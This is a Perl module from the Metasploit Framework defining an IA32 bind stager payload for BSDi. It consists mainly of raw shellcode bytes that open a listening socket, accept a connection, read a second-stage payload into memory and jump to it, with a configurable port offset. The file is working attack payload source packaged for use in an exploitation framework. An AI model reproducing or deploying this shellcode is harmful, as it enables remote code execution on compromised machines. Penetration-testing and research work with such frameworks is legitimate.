###############
##
#
#    Name: BindStager.pm
# Version: $Revision$
#  Source: src/shellcode/bsdi/ia32/stager_sock_bind.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 bind stager for BSDi.
#
##
###############

package Msf::PayloadComponent::BSDi::ia32::BindStager;

use strict;
use base 'Msf::PayloadComponent::BSDi::BindStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'bsdi' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					LPORT => [ 0x1f, 'n' ],
				},
			Payload =>
				"\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" .
				"\x31\xc0\x50\x40\x50\x40\x50\xb0\x61\xff\xd6\x52\x68\x10\x02\xbf" .
				"\xbf\x89\xe3\x6a\x10\x53\x50\x6a\x68\x58\xff\xd6\xb0\x6a\xff\xd6" .
				"\x59\x52\x52\x51\xb0\x1e\xff\xd6\x97\x6a\x03\x58\xb6\x0c\x52\x55" .
				"\x57\xff\xd6\xff\xe5"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
